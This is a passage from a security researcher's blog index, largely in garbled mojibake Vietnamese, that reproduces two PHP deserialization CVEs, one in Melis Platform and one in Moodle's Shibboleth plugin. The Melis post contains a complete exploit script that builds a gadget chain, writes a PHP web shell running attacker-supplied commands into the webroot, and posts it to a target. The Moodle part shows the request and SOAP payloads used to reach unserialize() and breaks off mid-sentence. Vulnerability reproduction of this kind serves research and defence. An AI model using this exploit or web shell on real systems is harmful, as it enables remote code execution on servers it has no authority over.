(Exception\\InvalidArgumentException $e) { throw new InvalidArgumentException($e-\u0026gt;getMessage(), $e-\u0026gt;getCode(), $e); } catch (Exception\\ExceptionInterface $e) { $saved = false; } finally { $options-\u0026gt;setTtl($ttl); } return $saved; } The code line $saved = $this-\u0026gt;storage-\u0026gt;setItem($item-\u0026gt;getKey(), $value);is used to save the value to the filesystem storage backend, and since we can control all variables of deserialized classes, we can point the filesystem storage to any file on the local disk and write to it.\nÄiá»u nÃ y cÃ³ thá»ƒ bá»‹ khai thÃ¡c báº±ng cÃ¡ch táº¡o má»™t ká»‹ch báº£n PHP trÃªn Ä‘Ä©a, cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c thi trá»±c tiáº¿p bá»Ÿi trÃ¬nh thÃ´ng dá»‹ch. Miá»…n lÃ  táº­p lá»‡nh cÃ³ pháº§n má»Ÿ rá»™ng .php vÃ  báº¯t Ä‘áº§u báº±ng \u0026lt;?php, báº¥t ká»³ dá»¯ liá»‡u nÃ o trÆ°á»›c nÃ³ Ä‘á»u bá»‹ bá» qua vÃ  trÃ¬nh thÃ´ng dá»‹ch PHP sáº½ thá»±c thi táº­p lá»‡nh.\nThis can be exploited by creating a PHP script on disk that can be directly executed by the interpreter. As long as the script has .php extension and starts with \u0026lt;?php, any data before it will be ignored, and the PHP interpreter will execute the script.\nWorkflow (from Remote Code Execution in Melis Platform | Sonar (sonarsource.com))\nMy Exploit This is the code Iâ€™ve written to exploit this vulnerability\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 \u0026lt;?php namespace Laminas\\Cache\\Psr\\CacheItemPool { class CacheItemPoolDecorator{} class CacheItem{} } namespace Laminas\\Cache\\Storage\\Adapter { class Filesystem{} class FilesystemOptions{} } namespace { function httpPost($url, $data) { $curl = curl_init($url); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_HEADER, true); curl_setopt($curl, CURLOPT_POSTFIELDS, $data); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_PROXY, \u0026#39;127.0.0.1:8080\u0026#39;); //proxy printf($curl); $response = curl_exec($curl); // var_dump($response); curl_close($curl); return $response; } function pwn($url, $param){ $shell = \u0026#39;\u0026lt;?php if(isset($_GET[\\\u0026#39;cmd\\\u0026#39;])) { system($_GET[\\\u0026#39;cmd\\\u0026#39;]); } ?\u0026gt;\u0026#39;; $cache_item = new Laminas\\Cache\\Psr\\CacheItemPool\\CacheItem; $cache_item-\u0026gt;key=\u0026#34;shell\u0026#34;; $cache_item-\u0026gt;value=$shell; $payload = new Laminas\\Cache\\Psr\\CacheItemPool\\CacheItemPoolDecorator; $payload-\u0026gt;storage = new Laminas\\Cache\\Storage\\Adapter\\Filesystem; $payload-\u0026gt;storage-\u0026gt;options = new Laminas\\Cache\\Storage\\Adapter\\FilesystemOptions; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; cacheDir = \u0026#34;/var/www/html/public\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; dirLevel = 0; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; suffix = \u0026#34;php\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; namespace = \u0026#34;\u0026#34;; $payload-\u0026gt;storage-\u0026gt;options-\u0026gt; keyPattern = \u0026#34;/.*/\u0026#34;; $payload-\u0026gt;deferred = array($cache_item); $data = \u0026#34;pluginHardcodedConfig=\u0026#34;.serialize($payload); // print($data); echo \u0026#34;\\n [*] Inject Payload \u0026#34;.$data; httpPost($url,$data); echo \u0026#34;\\n\\n\\n [*] Successful!\u0026#34;; } // Exploit Main // $url = $argv[1]; $url = \u0026#34;http://www.mysite.local/news/id/2\u0026#34;; $param = \u0026#34;Hacked: by0d0ff9\u0026#34;; pwn($url, $param); } ?\u0026gt; POC\nV References Remote Code Execution in Melis Platform | Sonar (sonarsource.com) dahse2014 (1).pdf\nCode Reuse Attacks in PHP | Proceedings of the 2014 ACM SIGSAC Conference on Computer and Communications Security Download \u0026amp; Documentation (melistechnology.com) https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laminas/FD/1 ","description":"Continuing from the previous article series, in this post, I will apply the knowledge learned and research on PHP deserialize to reproduce CVE-2022-39298.","id":6,"section":"posts","tags":["php"],"title":"Reproduce bug: Remote Code Execution in Melis Platform","uri":"https://minhlongmt183.github.io/posts/reproduce-bug-remote-code-execution-in-melis-platform/"},{"content":"CVE 2021-36394 - moodle Long time no see!\nÄá»£t nÃ y tÃ´i cÃ³ cÆ¡ há»™i lÃ m viá»‡c, nghiÃªn cá»©u vá» cÃ¡c CVE liÃªn quan Ä‘áº¿n PHP. Má»™t trong nhá»¯ng lá»—i tÃ´i lÃ m Ä‘áº§u tiÃªn liÃªn quan Ä‘áº¿n PHP-deserialize.\nÄÃ¢y lÃ  má»™t máº£ng kiáº¿n thá»©c má»›i mÃ  tÃ´i Ä‘Æ°á»£c tiáº¿p cáº­n. PhÆ°Æ¡ng phÃ¡p á»Ÿ Ä‘Ã¢y lÃ  tÃ´i sáº½ tÃ¬m hiá»ƒu cÃ¡c kiáº¿n thá»©c liÃªn quan Ä‘áº¿n PHP-deserialize, lÃ m má»™t vÃ i vÃ­ dá»¥, tÃ¬m hiá»ƒu cÃ¡c hÃ m hay bá»‹ lá»—i! Sau Ä‘Ã³, ta báº¯t Ä‘áº§u vÃ o CVE cá»§a mÃ¬nh.\nKiáº¿n thá»©c cÆ¡ báº£n cá»§a PHP deserialize cÃ³ thá»ƒ dá»… dÃ ng tÃ¬m kiáº¿m trÃªn Payload All Things.\nSau Ä‘Ã³, tÃ´i tÃ¬nh cá» tháº¥y blog viáº¿t vá» cÃ¡ch khai thÃ¡c PHP deserialize vá» moodle! Lá»— há»•ng nÃ y Ä‘Ã£ cÃ³ bÃ i viáº¿t, POC, cÃ¡c tÃ i liá»‡u liÃªn quan\u0026hellip; ÄÃ¢y lÃ  má»™t CVE lÃ­ tÆ°á»Ÿng Ä‘á»ƒ tÃ´i báº¯t Ä‘áº§u há»c!\nBÃ i nÃ y, tÃ´i sáº½ trÃ¬nh bÃ y láº¡i theo cÃ¡ch hiá»ƒu cá»§a tÃ´i.\nNgá»¯ cáº£nh Moodle báº­t shibboleth plugin Version bá»‹ lá»—i: 3.11, 3.10 to 3.10.4, 3.9 to 3.9.7 and earlier unsupported versions Chi tiáº¿t lá»— há»•ng Nháº­n diá»‡n lá»— há»•ng Äá»c bÃ i blog, ta biáº¿t Ä‘Æ°á»£c sink náº±m á»Ÿ Ä‘Æ°á»ng dáº«n auth/shibboleth/classes/helper.php, cá»¥ thá»ƒ á»Ÿ hÃ m logout_file_session 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 public static function logout_file_session($spsessionid) { global $CFG; if (!empty($CFG-\u0026gt;session_file_save_path)) { $dir = $CFG-\u0026gt;session_file_save_path; } else { $dir = $CFG-\u0026gt;dataroot . \u0026#39;/sessions\u0026#39;; } if (is_dir($dir)) { if ($dh = opendir($dir)) { // Read all session files. while (($file = readdir($dh)) !== false) { // Check if it is a file. if (is_file($dir.\u0026#39;/\u0026#39;.$file)) { // Read session file data. $data = file($dir.\u0026#39;/\u0026#39;.$file); if (isset($data[0])) { $usersession = self::unserializesession($data[0]); // Check if we have found session that shall be deleted. if (isset($usersession[\u0026#39;SESSION\u0026#39;]) \u0026amp;\u0026amp; isset($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id)) { // If there is a match, delete file. if ($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id == $spsessionid) { // Delete session file. if (!unlink($dir.\u0026#39;/\u0026#39;.$file)) { return new SoapFault(\u0026#39;LogoutError\u0026#39;, \u0026#39;Could not delete Moodle session file.\u0026#39;); } } } } } } closedir($dh); } } } Question: Náº¿u ngá»¯ cáº£nh 1day thÃ¬ sao? lÃ m sao biáº¿t Ä‘Æ°á»£c endpoint nÃ y? Ans:\nTrÃªn trang thÃ´ng bÃ¡o cá»§a Moodle cÃ³ thÃ´ng bÃ¡o vá» lá»— há»•ng Moodle.org: MSA-21-0022: Remote code execution risk when Shibboleth authentication is enabled\nTá»« trang nÃ y dáº«n tá»›i repo github cá»§a moodle khi commit Ä‘á»ƒ fix code\nOfficial Moodle git projects - moodle.git/search\nSá»­ dá»¥ng tÃ­nh nÄƒng commit diff sáº½ tháº¥y hÃ m bá»‹ lá»—i náº±m á»Ÿ /[auth/shibboleth/classes/helper.php](https://git.moodle.org/gw?p=moodle.git;a=blob;f=auth/shibboleth/classes\u0026gt; /helper.php;h=0e99d199957509a35d259704d3ee08e313aed510;hb=5bc561ee7ad31b769815821280f8a3f5bd69c31b)\nHÃ m nÃ y sáº½ thá»±c hiá»‡n cÃ¡c bÆ°á»›c sau\nLáº¥y Ä‘á»‹a chá»‰ thÆ° má»¥c lÆ°u cÃ¡c session, Ä‘Æ°á»ng dáº«n lÃ  $CFG-\u0026gt;dataroot/sessions/\n1 2 3 4 5 if (!empty($CFG-\u0026gt;session_file_save_path)) { $dir = $CFG-\u0026gt;session_file_save_path; } else { $dir = $CFG-\u0026gt;dataroot . \u0026#39;/sessions\u0026#39;; } Äá»c ná»™i dung file trong thÆ° má»¥c trÃªn vÃ  thá»±c hiá»‡n hÃ m self::unserializesession trÃªn tá»«ng ná»™i dung\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 if (is_dir($dir)) { if ($dh = opendir($dir)) { // Read all session files. while (($file = readdir($dh)) !== false) { // Check if it is a file. if (is_file($dir.\u0026#39;/\u0026#39;.$file)) { // Read session file data. $data = file($dir.\u0026#39;/\u0026#39;.$file); if (isset($data[0])) { $usersession = self::unserializesession($data[0]); // Check if we have found session that shall be deleted. if (isset($usersession[\u0026#39;SESSION\u0026#39;]) \u0026amp;\u0026amp; isset($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id)) { // If there is a match, delete file. if ($usersession[\u0026#39;SESSION\u0026#39;]-\u0026gt;shibboleth_session_id == $spsessionid) { // Delete session file. if (!unlink($dir.\u0026#39;/\u0026#39;.$file)) { return new SoapFault(\u0026#39;LogoutError\u0026#39;, \u0026#39;Could not delete Moodle session file.\u0026#39;); } } } } } } closedir($dh); } } DÃ²ng 8: ChÆ°Æ¡ng trÃ¬nh sáº½ Ä‘á»c tá»«ng file, lÆ°u giÃ¡ trá»‹ vÃ o biáº¿n $data .\nDÃ²ng 10 chÆ°Æ¡ng trÃ¬nh thá»±c hiá»‡n lá»‡nh self::unserializesession()\nHÃ m unserializesession($serializedstring)\n1 2 3 4 5 6 7 8 9 private static function unserializesession($serializedstring) { $variables = array(); $a = preg_split(\u0026#34;/(\\w+)\\|/\u0026#34;, $serializedstring, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); $counta = count($a); for ($i = 0; $i \u0026lt; $counta; $i = $i + 2) { $variables[$a[$i]] = unserialize($a[$i + 1]); } return $variables; } DÃ²ng 3, chuá»—i $serializedstring sáº½ bá»‹ split bá»Ÿi pattern /(\\w+)\\|/ Ä‘á»ƒ táº¡o thÃ nh 1 máº£ng cÃ¡c pháº§n tá»­ con.\nVÃ­ dá»¥:\n1 2 $serializedstring = \u0026#39;Hello|world\u0026#39;; ==\u0026gt; a = [\u0026#39;Hello\u0026#39;, \u0026#39;world\u0026#39;] DÃ²ng 4â€”\u0026gt;7: Tá»«ng pháº§n tá»­ cá»§a máº£ng $a truyá»n vÃ o hÃ m unserialize().\nKáº¿t luáº­n: Má»—i láº§n ngÆ°á»i dÃ¹ng truy cáº­p vÃ o moodle, session Ä‘á»u Ä‘Æ°á»£c lÆ°u láº¡i á»Ÿ folder $CFG-\u0026gt;dataroot/sessions/ Khi thá»±c hiá»‡n hÃ m logout_file_session(), chÆ°Æ¡ng trÃ¬nh Ä‘á»c láº§n lÆ°á»£t cÃ¡c file chá»©a session. Má»—i session sáº½ Ä‘Æ°á»£c split thÃ nh máº£ng cÃ¡c pháº§n tá»­ vá»›i delimiter lÃ  | Tá»«ng pháº§n tá»­ sáº½ lÃ  tham sá»‘ truyá»n vÃ o hÃ m unserialize() Náº¿u attacker cÃ³ thá»ƒ ghi Ä‘Æ°á»£c xuá»‘ng session thÃ¬ cÃ³ thá»ƒ control Ä‘Æ°á»£c tham sá»‘ truyá»n vÃ o unserialize() â‡’ dáº¥u hiá»‡u cá»§a lá»—i php deserialization\nphp deserialization\nÄá»ƒ khai thÃ¡c lá»— há»•ng php deserialization cáº§n 2 bÆ°á»›c chÃ­nh Control Ä‘Æ°á»£c tham sá»‘ truyá»n vÃ o hÃ m unserialize() XÃ¡c Ä‘á»‹nh kÄ© thuáº­t khai thÃ¡c, vá»›i PHP deserialization kÄ© thuáº­t khai thÃ¡c Property Oriented Programming (POP) thÆ°á»ng Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ khai thÃ¡c. Khai thÃ¡c lá»— há»•ng I. control tham sá»‘ truyá»n vÃ o hÃ m unserialize() á» pháº§n trÆ°á»›c chÃºng ta Ä‘Ã£ biáº¿t hÃ m unserialize() sáº½ láº¥y tham sá»‘ cÃ³ giÃ¡ trá»‹ tá»« sesion vÃ  session nÃ y Ä‘Æ°á»£c Ä‘á»c lÃªn tá»« file. Do Ä‘Ã³, má»™t hÆ°á»›ng Ä‘á»ƒ control Ä‘Æ°á»£c input vÃ o hÃ m unserialize() lÃ  tÃ¬m cÃ¡ch ghi xuá»‘ng sesion.\nÄá»ƒ tÃ¬m cÃ¡ch ghi xuá»‘ng session, trong source code, ta sáº½ tÃ¬m Ä‘áº¿n nÆ¡i thá»a 2 Ä‘iá»u kiá»‡n:\nBiáº¿n $SESSION Ä‘Æ°á»£c gÃ¡n giÃ¡ trá»‹. ThÆ°á»ng sáº½ cÃ³ dáº¡ng\n1 $SESSION-\u0026gt;field1= var1; GiÃ¡ trá»‹ Ä‘Æ°á»£c gÃ¡n vÃ o $SESSION Ä‘Æ°á»£c control bá»Ÿi user, á»Ÿ Ä‘Ã¢y lÃ  var1. Trong PHP, biáº¿n Ä‘Æ°á»£c ngÆ°á»i dÃ¹ng truyá»n vÃ o sáº½ Ä‘Æ°á»£c thÆ°c thi bá»Ÿi hÃ m optional_param() hoáº·c required_param().\nTÃ´i dÃ¹ng cÃ´ng cá»¥ grep vÃ  comm cá»§a ubuntu Ä‘á»ƒ giáº£i quyáº¿t váº¥n Ä‘á» nÃ y, cá»¥ thá»ƒ\n1 2 3 grep -HnrE \u0026#39;\\$SESSION-\u0026gt;\u0026#39; /var/www/html/moodle/ | awk -F \u0026#39;:\u0026#39; \u0026#39;{print $1}\u0026#39; | sort -u \u0026gt; file1.txt grep -HnrE \u0026#39;optional_param\\(|required_param\\(\u0026#39; /var/www/html/moodle/ | awk -F \u0026#39;:\u0026#39; \u0026#39;{print $1}\u0026#39; | sort -u \u0026gt; file2.txt comm -12 file1.txt file2.txt \u0026gt; file3.txt Ã nghÄ©a cá»§a tá»«ng cÃ¢u lá»‡nh thÃ¬ chá»‰ lÃ  kiáº¿n thá»©c cÆ¡ báº£n cá»§a linux, google 1 tÃ­ lÃ  ra ğŸ™‚.\nNÃ´m na lÃ  tÃ´i tÃ¬m cÃ¡c tá»‡p cÃ³ chá»©a chuá»—i thuá»™c 2 pattern trÃªn rá»“i lá»c ra cÃ¡c tá»‡p cÃ¹ng náº±m trong 2 file1, file2. BÆ°á»›c nÃ y khÃ¡ rÆ°á»m ra vÃ¬ grep khÃ´ng há»— trá»£ toÃ¡n tá»­ AND 2 pattern mÃ  chá»‰ OR thÃ´i.\nSau khi cÃ³ file3.txt thÃ¬ manual vÃ o tá»«ng file mÃ  tÃ¬m xem cÃ³ endpoint nÃ o hay khÃ´ng thÃ´i. (ÄÃ¢y lÃ  cÃ¡ch cá»§a tÃ¡c giáº£, cÅ©ng lÃ  nÆ¡i mÃ  chÃºng ta cÃ³ thá»ƒ cáº£i thiá»‡n phÆ°Æ¡ng phÃ¡p hoáº·c nghiÃªn cá»©u tÃ¬m phÆ°Æ¡ng phÃ¡p hiá»‡u quáº£ hÆ¡n)\nTiáº¿n hÃ nh Ä‘á»c, ta tÃ¬m Ä‘Æ°á»£c 1 endpoint á»Ÿ grade/report/grader/index.php, cá»¥ thá»ƒ:\n1 2 3 4 5 6 7 8 9 10 $graderreportsifirst = optional_param(\u0026#39;sifirst\u0026#39;, null, PARAM_NOTAGS); $graderreportsilast = optional_param(\u0026#39;silast\u0026#39;, null, PARAM_NOTAGS); // The report object is recreated each time, save search information to SESSION object for future use. if (isset($graderreportsifirst)) { $SESSION-\u0026gt;gradereport[\u0026#39;filterfirstname\u0026#39;] = $graderreportsifirst; } if (isset($graderreportsilast)) { $SESSION-\u0026gt;gradereport[\u0026#39;filtersurname\u0026#39;] = $graderreportsilast; } DÃ²ng 6, 9: GiÃ¡ trá»‹ biáº¿n $graderreportsifirst vÃ  $graderreportsilast Ä‘Æ°á»£c lÆ°u vÃ o session. DÃ²ng 1,2: GiÃ¡ trá»‹ biáº¿n $graderreportsifirst vÃ  $graderreportsilast Ä‘Æ°á»£c truyá»n bá»Ÿi ngÆ°á»i dÃ¹ng vá»›i 2 param láº§n lÆ°á»£t sifirst vÃ  silast. â‡’ ChÃºng ta chá»‰ cáº§n truyá»n 1 trong 2 param lÃ  Ä‘á»§. Endpoint nÃ y unauthenticated Äá»c thÃªm code, dá»… dÃ ng biáº¿t Ä‘Æ°á»£c format truyá»n vÃ o\n1 2 3 4 5 6 7 8 9 10 11 12 13 GET /moodle/grade/report/grader/index.php?id=1\u0026amp;sifirst=xxxx|EDISC-here-PAYLOAD|yyyyyyy HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: MoodleSession=4ganll3d78sv5gjlcqqhd1lue0 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Tiáº¿n hÃ nh cháº¡y vÃ  debug, ta xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c\nÄ‘á»‹a chá»‰ lÆ°u session lÃ  /var/www/moodledata/sessions Äá»ƒ dá»… debug, ta vÃ o thÆ° má»¥c trÃªn, xÃ³a háº¿t cÃ¡c session Ä‘ang cÃ³ vÃ  thá»±c hiá»‡n request Ä‘á»ƒ lÆ°u session ÄÃ£ viáº¿t session thÃ nh cÃ´ng, kiá»ƒm tra giÃ¡ trá»‹ truyá»n vÃ o hÃ m unserialize() Tiáº¿n hÃ nh debug Ä‘á»ƒ kiá»ƒm tra xem giÃ¡ trá»‹ cÃ³ thá»±c sá»± Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ m unserialize() khÃ´ng. BÃ¢y giá», cÃ¢u chuyá»‡n lÃ  lÃ m sao Ä‘á»ƒ tÃ¬m Ä‘Æ°á»£c source Ä‘á»ƒ reach tá»›i Ä‘Æ°á»£c sink unserialize() II. Tá»« source tá»›i sink á» pháº§n 1 ta Ä‘Ã£ ghi Ä‘Ã¨ xuá»‘ng session vá»›i giÃ¡ trá»‹ báº¥t kÃ¬. Äá»c code ta biáº¿t Ä‘Æ°á»£c giÃ¡ trá»‹ cá»§a mÃ¬nh truyá»n vÃ o sáº½ Ä‘Æ°á»£c truyá»n vÃ o hÃ m unserialize()\nTrong pháº§n nÃ y ta sáº½ tÃ¬m source Ä‘á»ƒ dáº«n tá»›i sink unserialize() Ä‘á»ƒ cháº¡y debug, kiá»ƒm tra giÃ¡ trá»‹ truyá»n vÃ o cÃ³ Ä‘Ãºng nhÆ° dá»± Ä‘oÃ¡n khÃ´ng vÃ  Ä‘Ã¢y cÅ©ng lÃ  nÆ¡i trigger payload exploit.\nSá»­ dá»¥ng tÃ­nh nÄƒng Go to references trÃªn vscode, ta dá»… dÃ ng tÃ¬m Ä‘Æ°á»£c endpoint táº¡i hÃ m LogoutNotification() táº¡i auth/shibboleth/logout.php\n1 2 3 4 5 6 7 8 9 10 11 12 function LogoutNotification($spsessionid) { $sessionclass = \\core\\session\\manager::get_handler_class(); switch ($sessionclass) { case \u0026#39;\\core\\session\\file\u0026#39;: return \\auth_shibboleth\\helper::logout_file_session($spsessionid); case \u0026#39;\\core\\session\\database\u0026#39;: return \\auth_shibboleth\\helper::logout_db_session($spsessionid); default: throw new moodle_exception(\u0026#34;Shibboleth logout not implemented for \u0026#39;$sessionclass\u0026#39;\u0026#34;); } // If no SoapFault was thrown, the function will return OK as the SP assumes. } Endpoint auth/shibboleth/logout.php cÃ³ luá»“ng thá»±c thi nhÆ° sau:\nChÆ°Æ¡ng trÃ¬nh láº¥y 2 tham sá»‘ action vÃ  return tá»« url vÃ  xÃ¡c Ä‘á»‹nh protocol Ä‘Æ°á»£c sá»­ dá»¥ng\n1 2 3 4 5 6 7 8 $action = optional_param(\u0026#39;action\u0026#39;, \u0026#39;\u0026#39;, PARAM_ALPHA); $redirect = optional_param(\u0026#39;return\u0026#39;, \u0026#39;\u0026#39;, PARAM_URL); // Find out whether host supports https $protocol = \u0026#39;http://\u0026#39;; if (is_https()) { $protocol = \u0026#39;https://\u0026#39;; } Kiá»ƒm tra xem plugin shibboleth cÃ³ Ä‘Æ°á»£c báº­t khÃ´ng. (Do Ä‘Ã³, á»Ÿ pháº§n setup mÃ´i trÆ°á»ng, chÃºng ta pháº£i báº­t plugin nÃ y lÃªn má»›i reproduce Ä‘Æ°á»£c)\n1 2 3 4 // If the shibboleth plugin is not enable, throw an exception. if (!is_enabled_auth(\u0026#39;shibboleth\u0026#39;)) { throw new moodle_exception(get_string(\u0026#39;pluginnotenabled\u0026#39;, \u0026#39;auth\u0026#39;, \u0026#39;shibboleth\u0026#39;)); } Láº¥y giÃ¡ trá»‹ truyá»n vÃ o $inputstream vÃ  kiá»ƒm tra cÃ¢u lá»‡nh ráº½ nhÃ¡nh.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // Front channel logout. $inputstream = file_get_contents(\u0026#34;php://input\u0026#34;); if ($action == \u0026#39;logout\u0026#39; \u0026amp;\u0026amp; !empty($redirect)) { if (isloggedin($USER) \u0026amp;\u0026amp; $USER-\u0026gt;auth == \u0026#39;shibboleth\u0026#39;) { // Logout user from application. require_logout(); } // Finally, send user to the return URL. redirect($redirect); } else if (!empty($inputstream)) { // Back channel logout. // Set SOAP header. $server = new SoapServer($protocol.$_SERVER[\u0026#39;HTTP_HOST\u0026#39;].$_SERVER[\u0026#39;PHP_SELF\u0026#39;].\u0026#39;/LogoutNotification.wsdl\u0026#39;); $server-\u0026gt;addFunction(\u0026#34;LogoutNotification\u0026#34;); $server-\u0026gt;handle(); } else { // Return WSDL. VÃ¬ má»¥c tiÃªu cá»§a chÃºng ta náº±m á»Ÿ nhÃ¡nh thá»© 2 Ä‘á»ƒ gá»i hÃ m LogoutNotification nÃªn chÃºng ta truyá»n vÃ o action=logout vÃ  $redirect=null (tá»©c lÃ  khÃ´ng cáº§n truyá»n vÃ o). Má»i thá»© so easy, nhÆ°ng vá»›i 1 newbiee PHP nhÆ° tÃ´i thÃ¬ SoapServer á»Ÿ dÃ²ng 18 cÅ©ng nhÆ° hÃ m nháº­p á»Ÿ dÃ²ng 2 khÃ¡ láº¡ láº«m. Do Ä‘Ã³ trÆ°á»›c khi tiáº¿p tá»¥c tÃ´i pháº£i Ä‘i tÃ¬m hiá»ƒu SoapServer lÃ  gÃ¬ vÃ  truyá»n giÃ¡ trá»‹ vÃ o $inputstream lÃ  gÃ¬ má»›i há»£p lá»‡.\n1 2 // Front channel logout. $inputstream = file_get_contents(\u0026#34;php://input\u0026#34;); Náº¿u ngÃ y xÆ°a chÃºng ta cÃ³ cÃ¢u: â€œcÃ¡i gÃ¬ khÃ´ng biáº¿t thÃ¬ tra googleâ€ thÃ¬ ngÃ y nay trÆ°á»›c khi tra google chÃºng ta cÃ³ thá»ƒ Ä‘i há»i anh báº¡n chatgpt rá»“i sau Ä‘Ã³ google Ä‘á»ƒ kiá»ƒm chá»©ng hiá»ƒu rÃµ hÆ¡n chapgpt\nfile_get_contents(\u0026quot;php://input\u0026quot;) lÃ  má»™t hÃ m trong PHP Ä‘á»ƒ Ä‘á»c dá»¯ liá»‡u tá»« body cá»§a HTTP request. Khi báº¡n gá»­i má»™t HTTP request tá»« má»™t client (vÃ­ dá»¥ nhÆ° trÃ¬nh duyá»‡t web) tá»›i má»™t server, ná»™i dung cá»§a request Ä‘Æ°á»£c Ä‘Æ°a vÃ o body cá»§a request.\nTrong PHP, \u0026quot;php://input\u0026quot; lÃ  má»™t stream wrapper, cho phÃ©p Ä‘á»c dá»¯ liá»‡u tá»« body cá»§a request báº±ng cÃ¡ch Ä‘á»c dá»¯ liá»‡u tá»« má»™t input stream.\nDo Ä‘Ã³, khi sá»­ dá»¥ng file_get_contents(\u0026quot;php://input\u0026quot;), báº¡n Ä‘ang yÃªu cáº§u PHP Ä‘á»c dá»¯ liá»‡u tá»« body cá»§a request vÃ  tráº£ vá» dá»¯ liá»‡u dÆ°á»›i dáº¡ng má»™t chuá»—i (string). Báº¡n cÃ³ thá»ƒ sá»­ dá»¥ng káº¿t quáº£ nÃ y Ä‘á»ƒ xá»­ lÃ½ dá»¯ liá»‡u cá»§a request trong á»©ng dá»¥ng PHP cá»§a mÃ¬nh.\nDá»… hiá»ƒu Ä‘Ã¢y lÃ  cÃ¡ch Ä‘á»ƒ Ä‘á»c giÃ¡ trá»‹ thÃ´i, vÃ o Ä‘á»ƒ truyá»n báº±ng RESTAPI thÃ¬ ta cáº§n dÃ¹ng POST method CÃ²n vá»›i soap thÃ¬ tÃ´i Ä‘á»c trÃªn w3schools: https://www.w3schools.com/xml/xml_soap.asp Vá» cÆ¡ báº£n, XML SOAP (Simple Object Access Protocol) lÃ  má»™t chuáº©n giao thá»©c Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ trao Ä‘á»•i dá»¯ liá»‡u giá»¯a cÃ¡c á»©ng dá»¥ng pháº§n má»m khÃ¡c nhau. NÃ³ sá»­ dá»¥ng ngÃ´n ngá»¯ XML Ä‘á»ƒ mÃ£ hÃ³a dá»¯ liá»‡u vÃ  cÃ¡c thÃ´ng Ä‘iá»‡p truyá»n táº£i giá»¯a cÃ¡c há»‡ thá»‘ng khÃ¡c nhau thÃ´ng qua giao thá»©c HTTP hoáº·c cÃ¡c giao thá»©c khÃ¡c. Äá»c hiá»ƒu 1 tÃ­, ta cÃ³ thá»ƒ xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c payload truyá»n vÃ o lÃ  1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34;\u0026gt;\u0026lt;SOAP-ENV:Body\u0026gt; \u0026lt;LogoutNotification\u0026gt; \u0026lt;spsessionid\u0026gt;sssssu\u0026lt;/spsessionid\u0026gt; \u0026lt;/LogoutNotification\u0026gt; \u0026lt;/SOAP-ENV:Body\u0026gt;\u0026lt;/SOAP-ENV:Envelope\u0026gt; Trong Ä‘Ã³, \u0026lt;LogoutNotification\u0026gt; lÃ  request chÃºng ta muá»‘n gá»i vÃ  \u0026lt;spsessionid\u0026gt; lÃ  tham sá»‘ cá»§a function nÃ y\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /******************************************************************************/ /** * Handles SOAP Back-channel logout notification * * @param string $spsessionid SP-provided Shibboleth Session ID * @return SoapFault or void if everything was fine */ function LogoutNotification($spsessionid) { $sessionclass = \\core\\session\\manager::get_handler_class(); switch ($sessionclass) { case \u0026#39;\\core\\session\\file\u0026#39;: return \\auth_shibboleth\\helper::logout_file_session($spsessionid); case \u0026#39;\\core\\session\\database\u0026#39;: return \\auth_shibboleth\\helper::logout_db_session($spsessionid); default: throw new moodle_exception(\u0026#34;Shibboleth logout not implemented for \u0026#39;$sessionclass\u0026#39;\u0026#34;); } // If no SoapFault was thrown, the function will return OK as the SP assumes. } Truyá»n payload vÃ  kiá»ƒm tra input cá»§a hÃ m unserialize()\nNhÆ° váº­y, Ä‘á»ƒ control input vÃ o hÃ m unserialize() chÃºng ta cáº§n 2 payload\npayload1: method GET, má»¥c tiÃªu viáº¿t payload xuá»‘ng session payload2: method POST, má»¥c tiÃªu trigger payload qua hÃ m unserialize() NhÆ° váº­y, trong pháº§n nÃ y chÃºng ta Ä‘Ã£ thÃ nh cÃ´ng trong viá»‡c control input vÃ o hÃ m unserialize(), bÆ°á»›c tiáº¿p theo tiáº¿n hÃ nh xÃ¢y dá»±ng payload khai thÃ¡c.\nIII. Khai thÃ¡c báº±ng ká»¹ thuáº­t POP Má»¥c tiÃªu cá»§a ká»¹ thuáº­t nÃ y mÃ¬nh sáº½ táº¡o má»™t gadget chains Ä‘á»ƒ exploit\ngadget chains lÃ  má»™t dÃ£y gá»“m cÃ¡c phÆ°Æ¡ng thá»©c cÃ³ kháº£ nÄƒng gá»i láº«n 